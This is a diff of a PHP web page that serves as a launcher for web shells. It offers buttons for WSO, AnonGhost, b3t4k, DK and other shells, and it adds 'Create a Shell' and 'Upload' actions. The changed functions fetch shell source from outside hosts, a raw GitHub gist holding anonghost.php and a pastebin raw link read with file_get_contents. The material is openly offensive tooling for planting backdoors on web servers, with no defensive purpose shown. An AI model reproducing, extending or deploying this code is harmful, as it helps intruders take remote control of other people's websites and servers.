@@ -5,6 +5,7 @@
 
 
 <style>
+
 body {
 	text-align: center;
 	background: black;
@@ -109,6 +110,37 @@ h2{
 	font-family:Orbitron; 
 }
 
+
+button{
+	background: black;
+	color: white;
+	padding: 7px;
+	cursor: pointer;
+	outline: none;
+	border-radius: 22px;
+	border-color: red;
+	font-family: Hammersmith One;
+
+}
+
+/** button Hover **/
+
+button:hover{
+
+	background:#2E2727;
+	padding: 7px;
+	cursor: pointer;
+	color: lime;
+	outline: none;
+	font-family: Hammersmith One;
+}
+
+a{
+	text-decoration: none;
+	color: white;
+}
+
+
 </style>
 
 <?php 
@@ -191,7 +223,8 @@ if ( 	isset($_POST['filename'])	&& 	isset($_POST['content']) ) {
 
 <form action="" method="post">
 
-<input type="submit" name="exec" value="System Shell"> <input type="submit" name="mannushell" value="Mannu Shell ICA"> <input type="submit" name="wso" value="WSO Shell"> <input type="submit" name="raz" value="TinyShell"> <input type="submit" name="webAdmin" value="webAdmin Shell"> <input type="submit" name="anonGhost" value="AnonGhost Shell"> <input type="submit" name="dhanush" value="Dhanush Shell"> <input type="submit" name="dk" value="DK Shell"> <input type="submit" name="betak" value="b3t4k v 1.0"> <input type="submit" name="betakv3" value="b3t4k v 3.2.2"> 
+<input type="submit" name="exec" value="System Shell"> <input type="submit" name="mannushell" value="Mannu Shell ICA"> <input type="submit" name="wso" value="WSO Shell"> <input type="submit" name="raz" value="TinyShell"> <input type="submit" name="webAdmin" value="webAdmin Shell"> <input type="submit" name="anonGhost" value="AnonGhost Shell"> <input type="submit" name="dhanush" value="Dhanush Shell"> <input type="submit" name="dk" value="DK Shell"> <input type="submit" name="betak" value="b3t4k v 1.0"> <input type="submit" name="betakv3" value="b3t4k v 3.2.2">
+<br> <br> <button><a href="?createashell">Create a Shell</a></button> <button><a href="?upload">Upload</a></button>
 
 
 
@@ -200,6 +233,7 @@ if ( 	isset($_POST['filename'])	&& 	isset($_POST['content']) ) {
 
 
 <?php 
+
 
 /** The exec block starts here **/ 
 function sysExec() {
@@ -387,7 +421,7 @@ function anonGhost() {
 
 			if (isset($exec)) {
 				
-				$go = "Go Get it Here: http://pasted.co/5f664691";
+				$go = "https://gist.githubusercontent.com/rony-das/44693720c45e747d484e9c01e630b97a/raw/6a02a318ab950a3aca021ecdbfa50006ffc4e8ef/anonghost.php";
 				return $go;
 
 			}
@@ -429,7 +463,7 @@ function dhanush() {
 
 			if (isset($exec)) {
 				
-				$code = "https://gist.githubusercontent.com/rony-das/44693720c45e747d484e9c01e630b97a/raw/6a02a318ab950a3aca021ecdbfa50006ffc4e8ef/anonghost.php";
+				$code = "http://pastebin.com/raw/3YJkTzgR";
 				$html = file_get_contents($code);
 				$f = htmlentities($html);
 				return $f;
